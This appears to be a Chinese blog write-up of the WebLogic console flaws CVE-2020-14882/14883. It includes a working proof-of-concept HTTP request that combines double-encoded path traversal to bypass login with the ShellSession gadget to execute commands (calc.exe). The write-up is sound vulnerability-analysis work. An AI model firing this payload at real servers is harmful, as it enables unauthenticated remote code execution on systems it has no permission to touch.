\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s?\_\_biz=MzUzNTEyMTE0Mw==&mid=2247484227&idx=1&sn=ebf785ae178f179711f8ce426e3f4380&chksm=fa8b1edbcdfc97cdd31530a8c1b62f293a6ab859d9b99ffa6bd6e863895f2639ffe40a3ee4e6&mpshare=1&scene=1&srcid=1029bKkQngGz1d0XogyfJF4u&sharer\_sharetime=1603931210864&sharer\_shareid=c051b65ce1b8b68c6869c6345bc45da1&key=9d3ca08bb5be9f04c54e415bc677a3239d8e48490a4721e9e014e9117240d110dd9f507f3b54f83459f48a27fa8291706241e6216f25be421aa14694e7dfd91f0b6aa0986e5591b8387a8707945f3d049e458ce7a83fd77ac9365b53753199675e9ac41a1fea4ecaee1e5ec9626653685aaff76f7c579cbcc9a40ba509ebf324&ascene=1&uin=ODk4MDE0MDEy&devicetype=Windows+10+x64&version=6300002f&lang=zh\_CN&exportkey=Ac0J1KeMjequVIoB%2BgglwDg%3D&pass\_ticket=XqanHwJmjJ0Tdk%2BrPOdb72YYtpZjyKrL7crfEBca6UpzsRYBedqq7VDwWAi4OjhS&wx\_header=0)

简介
--

未经身份验证的远程攻击者可能通过构造特殊的 HTTP GET 请求，利用该漏洞在受影响的 WebLogic Server 上执行任意代码。它们均存在于 WebLogic 的 Console 控制台组件中。此组件为 WebLogic 全版本默认自带组件，且该漏洞通过 HTTP 协议进行利用。将 CVE-2020-14882 和 CVE-2020-14883 进行组合利用后，远程且未经授权的攻击者可以直接在服务端执行任意代码，获取系统权限。

![](https://mmbiz.qpic.cn/mmbiz_png/cOCqjucntdFLjibicO4l1RV6XibKWiaD2pCXG6Riad5sxxYRTtcueeoia0KocZwT8Fj9JYicU6QSvJcPbaWTyeXFxCBRQ/640?wx_fmt=png)

根据补丁 diff 结果我们可以看出，可以看出上面的变化

我们可以通过下面的代码，任意加载某个类或者对象

```
http://<target>/console/console.portal?\_nfpb=true&\_pageLabel=HomePage1&handle=java.lang.String("ahihi")
```

![](https://mmbiz.qpic.cn/mmbiz_png/cOCqjucntdFLjibicO4l1RV6XibKWiaD2pCX1VnicHbyIr3lfZdXKp5Zbla6KQBNLjSu6VbUFufY3YqSfkb0sH8ToDw/640?wx_fmt=png)

未授权访问
-----

![](https://mmbiz.qpic.cn/mmbiz_png/cOCqjucntdFLjibicO4l1RV6XibKWiaD2pCXoclNeh7vFBF345w1B5zicH3BoJVKeXyQTPpYJsKLIcvMzlwlkpAdkFw/640?wx_fmt=png)

非法字符绕过登陆保护

POC
---

首先通过非法字符绕过访问，然后通过 Gadget 调用命令执行，poc 如下

![](https://mmbiz.qpic.cn/mmbiz_png/cOCqjucntdFLjibicO4l1RV6XibKWiaD2pCXv1gI1xsPZabNFibXPYL5D5ey6Ja4VS3kAcLIRvHSby6UicoiaNXn6rS8w/640?wx_fmt=png)

```
GET /console/images/%252E%252E%252Fconsole.portal?\_nfpb=true&\_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22); HTTP/1.1Host: 192.168.3.189:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeCookie: ADMUpgrade-Insecure-Requests: 1
```